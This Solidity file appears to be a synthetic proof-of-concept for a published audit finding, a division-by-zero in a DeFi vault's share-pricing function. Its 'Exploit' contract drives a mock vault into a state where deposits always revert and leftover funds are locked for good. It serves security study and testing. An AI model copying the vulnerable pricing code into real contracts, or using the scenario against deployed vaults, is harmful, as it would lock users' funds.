// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Polynomial Protocol — [H-06] Division by zero error causes KangarooVault to
    be DoS with funds locked inside
    (Code4rena 2023-03; finding #20229, reporter peakbolt)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    KangarooVault.getTokenPrice is inlined VERBATIM:

        if (totalFunds == 0) {
            return 1e18;
        }
        uint256 totalSupply = getTotalSupply();
        if (positionData.positionId == 0) {
            return totalFunds.divWadDown(totalSupply);   // @> divides by
                                                         //    totalSupply == 0
        }

    Root cause: when totalFunds != 0 and positionData.positionId == 0 and the
    share supply is 0, getTokenPrice divides by zero and reverts. This state is
    reachable: after all positions close and all holders withdraw, a residual
    can remain in the vault (a delayed settlement / rounding leftover). Because
    initiateDeposit relies on getTokenPrice to price new shares, deposits now
    ALWAYS revert — the vault can never mint shares again. And the residual
    cannot be withdrawn either, since there are no shares left to burn. The
    funds are permanently locked and the vault is bricked.

    Harm class: permanent DoS with funds locked. Nothing is extracted, so this
    is a zero-profit INVARIANT: run() drives the vault into the bad state and
    asserts getTokenPrice reverts, initiateDeposit reverts, and the residual is
    trapped with no shares to redeem it.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal fixed-point helpers (solmate-compatible semantics).
library FixedPointMathLib {
    uint256 internal constant WAD = 1e18;

    function mulWadDown(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * y) / WAD;
    }

    function divWadDown(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * WAD) / y; // reverts on y == 0 (Solidity 0.8 panic 0x12)
    }

    function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y) / d;
    }
}

/// @dev Minimal ERC20 (sUSD), the vault's underlying / LP capital.
contract MockERC20 {
    string public name = "Synthetic USD";
    string public symbol = "sUSD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal Exchange type (referenced by getTokenPrice's open-position
///      branch, which is never reached in this PoC — positionId stays 0).
contract Exchange {
    function getMarkPrice() external pure returns (uint256, bool) {
        return (1e18, false);
    }
}

/// @dev Minimal perp market type (same — only the open-position branch uses it).
contract PerpMarket {
    function remainingMargin(address) external pure returns (uint256, bool) {
        return (0, false);
    }
}

/// @notice Reduced KangarooVault. Deposits/withdrawals price shares via the
///         verbatim vulnerable getTokenPrice.
contract KangarooVault {
    using FixedPointMathLib for uint256;

    struct PositionData {
        uint256 positionId;
        uint256 shortAmount;
        uint256 totalCollateral;
        uint256 premiumCollected;
    }

    PositionData public positionData;

    MockERC20 public SUSD;
    Exchange public EXCHANGE;
    PerpMarket public PERP_MARKET;

    uint256 public totalFunds;
    uint256 public usedFunds;

    // share token
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(MockERC20 _susd) {
        SUSD = _susd;
    }

    function getTotalSupply() public view returns (uint256) {
        return totalSupply;
    }

    /// @notice VERBATIM reduction of KangarooVault.getTokenPrice.
    function getTokenPrice() public view returns (uint256) {
        if (totalFunds == 0) {
            return 1e18;
        }

        uint256 totalSupply_ = getTotalSupply();
        if (positionData.positionId == 0) {
            return totalFunds.divWadDown(totalSupply_); // @> VULN: divides by totalSupply_, which is 0 once all holders have withdrawn while funds remain
        }

        uint256 totalMargin;

        (uint256 markPrice, bool isInvalid) = EXCHANGE.getMarkPrice();
        require(!isInvalid);
        (totalMargin, isInvalid) = PERP_MARKET.remainingMargin(address(this));
        require(!isInvalid);

        uint256 totalValue = totalFunds + positionData.premiumCollected + totalMargin + positionData.totalCollateral;
        totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount));

        return totalValue.divWadDown(totalSupply_);
    }

    /// @notice Deposit sUSD and mint shares at the current token price. Relies
    ///         on getTokenPrice — so it reverts whenever getTokenPrice reverts.
    function initiateDeposit(address user, uint256 amount) external {
        uint256 price = getTokenPrice(); // reverts (div-by-zero) in the bad state
        SUSD.transferFrom(msg.sender, address(this), amount);
        uint256 shares = amount.mulDivDown(1e18, price);
        balanceOf[user] += shares;
        totalSupply += shares;
        totalFunds += amount;
    }

    /// @notice Redeem all of `user`'s shares at the current price.
    function withdraw(address user) external returns (uint256 payout) {
        uint256 shares = balanceOf[user];
        uint256 price = getTokenPrice();
        payout = shares.mulWadDown(price);

        balanceOf[user] = 0;
        totalSupply -= shares;
        totalFunds -= payout;

        SUSD.transfer(user, payout);
    }

    /// @notice A closed position (or delayed premium/margin) settles back into
    ///         the vault. Models "remaining funds when all positions are closed
    ///         and all holders have withdrawn" — funds arriving with supply == 0.
    function settleResidual(uint256 amount) external {
        SUSD.transferFrom(msg.sender, address(this), amount);
        totalFunds += amount;
    }
}

/// @dev Orchestrator: deposits, withdraws everything, then a residual settles
///      into the vault after all holders have left. Proves the vault is now
///      permanently DoS'd (deposits revert) with the residual locked inside.
contract Exploit {
    uint256 public constant DEPOSIT = 1e18;
    uint256 public constant RESIDUAL = 168969; // dust that settles back after everyone exits (as in the finding)

    address public constant USER = 0x0000000000000000000000000000000000001234;

    MockERC20 public susd;
    KangarooVault public vault;

    constructor() {
        susd = new MockERC20(); // CREATE nonce 1
        vault = new KangarooVault(susd); // CREATE nonce 2 (vulnerable)

        // Fund the orchestrator so it can deposit / settle on behalf of USER.
        susd.mint(address(this), DEPOSIT + RESIDUAL);
        susd.approve(address(vault), type(uint256).max);
    }

    function run() external {
        // 1. A healthy deposit works: totalFunds == 0 -> price 1e18.
        vault.initiateDeposit(USER, DEPOSIT);
        require(vault.totalSupply() == DEPOSIT, "deposit failed");
        require(vault.totalFunds() == DEPOSIT, "funds not booked");

        // 2. The sole holder withdraws everything: supply and funds go to 0.
        vault.withdraw(USER);
        require(vault.totalSupply() == 0, "supply not zero");
        require(vault.totalFunds() == 0, "funds not zero");

        // 3. A closed position settles a residual back into the vault AFTER all
        //    holders have exited: funds now exist with supply == 0.
        vault.settleResidual(RESIDUAL);
        require(vault.totalFunds() == RESIDUAL, "residual not booked");
        require(vault.totalSupply() == 0, "supply should still be zero");
        require(susd.balanceOf(address(vault)) == RESIDUAL, "residual not held");

        // === HARM ===
        // getTokenPrice now divides by zero (totalFunds != 0, positionId == 0,
        // totalSupply == 0) and reverts.
        require(_getTokenPriceReverts(), "getTokenPrice did not revert");

        // Because initiateDeposit relies on getTokenPrice, EVERY future deposit
        // reverts: the vault can never mint shares again — permanent DoS.
        require(_depositReverts(USER, DEPOSIT), "deposit did not revert");

        // ...and the residual is unrecoverable: there are no shares to burn, so
        // withdraw cannot return it. It is permanently locked in the vault.
        require(vault.totalSupply() == 0 && susd.balanceOf(address(vault)) == RESIDUAL, "residual not locked");
    }

    function _getTokenPriceReverts() internal view returns (bool) {
        try vault.getTokenPrice() returns (uint256) {
            return false;
        } catch {
            return true;
        }
    }

    function _depositReverts(address user, uint256 amount) internal returns (bool) {
        try vault.initiateDeposit(user, amount) {
            return false;
        } catch {
            return true;
        }
    }
}
